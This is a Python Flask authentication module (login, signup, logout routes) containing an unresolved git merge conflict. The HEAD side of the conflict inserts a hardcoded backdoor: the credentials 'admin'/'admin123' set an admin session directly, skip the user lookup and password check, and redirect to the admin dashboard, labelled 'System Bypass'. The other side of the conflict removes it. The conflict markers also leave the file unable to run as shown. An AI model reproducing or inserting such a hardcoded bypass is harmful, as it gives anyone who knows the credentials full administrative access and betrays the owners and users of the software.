"""Authentication routes (login, signup, logout)."""
from flask import Blueprint, render_template, request, redirect, url_for, flash, session
from auth.decorators import login_required, logout_user, login_user
import re


auth_bp = Blueprint('auth', __name__, url_prefix='/auth')


def init_auth_routes(app, user_model):
    """Initialize authentication routes with models."""
    
    @auth_bp.route('/login', methods=['GET', 'POST'])
    def login():
        """Login page and handler."""
        # Redirect if already logged in
        if 'user_id' in session:
            return redirect(url_for('index'))
        
        if request.method == 'POST':
            username = request.form.get('username', '').strip()
            password = request.form.get('password', '')
            remember = request.form.get('remember') == 'on'
            
            if not username or not password:
                flash('Please provide both username and password.', 'danger')
                return render_template('auth/login.html')
            
<<<<<<< HEAD
            # DEFAULT ADMIN LOGIN SHORTCUT
            if username == 'admin' and password == 'admin123':
                session['user_id'] = 'admin'
                session['username'] = 'Admin'
                session['user_role'] = 'admin'
                session.permanent = True
                flash('Logged in as Admin (System Bypass)', 'success')
                return redirect(url_for('admin.dashboard'))
            
=======
>>>>>>> uploaded
            # Find user
            user = user_model.get_user_by_username(username)
            
            if not user:
                flash('Invalid username or password.', 'danger')
                return render_template('auth/login.html')
            
            # Check if user is active
            if not user.get('is_active', True):
                flash('Your account has been deactivated.', 'danger')
                return render_template('auth/login.html')
            
            # Verify password
            if not user_model.verify_password(user, password):
                flash('Invalid username or password.', 'danger')
                return render_template('auth/login.html')
            
            # Login successful
            login_user(user)
            user_model.update_last_login(user['_id'])
            
            flash(f'Welcome back, {user["username"]}!', 'success')
            
            # Redirect to next page or home
            next_page = request.args.get('next')
            if next_page and next_page.startswith('/'):
                return redirect(next_page)
            
            # Redirect admin to dashboard
            if user.get('role') == 'admin':
                return redirect(url_for('admin.dashboard'))
            
            return redirect(url_for('index'))
        
        return render_template('auth/login.html')
    
    @auth_bp.route('/signup', methods=['GET', 'POST'])
    def signup():
        """Signup page and handler."""
        # Redirect if already logged in
        if 'user_id' in session:
            return redirect(url_for('index'))
        
        if request.method == 'POST':
            username = request.form.get('username', '').strip()
            email = request.form.get('email', '').strip()
            password = request.form.get('password', '')
            confirm_password = request.form.get('confirm_password', '')
            
            # Validation
            errors = []
            
            if not username or len(username) < 3:
                errors.append('Username must be at least 3 characters long.')
            
            if not re.match(r'^[a-zA-Z0-9_]+$', username):
                errors.append('Username can only contain letters, numbers, and underscores.')
            
            if not email or not re.match(r'^[^@]+@[^@]+\.[^@]+$', email):
                errors.append('Please provide a valid email address.')
            
            if not password or len(password) < 6:
                errors.append('Password must be at least 6 characters long.')
            
            if password != confirm_password:
                errors.append('Passwords do not match.')
            
            if errors:
                for error in errors:
                    flash(error, 'danger')
                return render_template('auth/signup.html', 
                                     username=username, 
                                     email=email)
            
            # Check if user already exists
            if user_model.get_user_by_username(username):
                flash('Username already taken. Please choose another.', 'danger')
                return render_template('auth/signup.html', 
                                     username='', 
                                     email=email)
            
            if user_model.get_user_by_email(email):
                flash('Email already registered. Please log in instead.', 'danger')
                return render_template('auth/signup.html', 
                                     username=username, 
                                     email='')
            
            # Create user
            user_id = user_model.create_user(username, email, password, role='user')
            
            if user_id:
                flash('Account created successfully! Please log in.', 'success')
                return redirect(url_for('auth.login'))
            else:
                flash('An error occurred. Please try again.', 'danger')
                return render_template('auth/signup.html')
        
        return render_template('auth/signup.html')
    
    @auth_bp.route('/logout')
    @login_required
    def logout():
        """Logout handler."""
        username = session.get('username', 'User')
        logout_user()
        flash(f'Goodbye, {username}!', 'info')
        return redirect(url_for('index'))
    
    # Register blueprint
    app.register_blueprint(auth_bp)
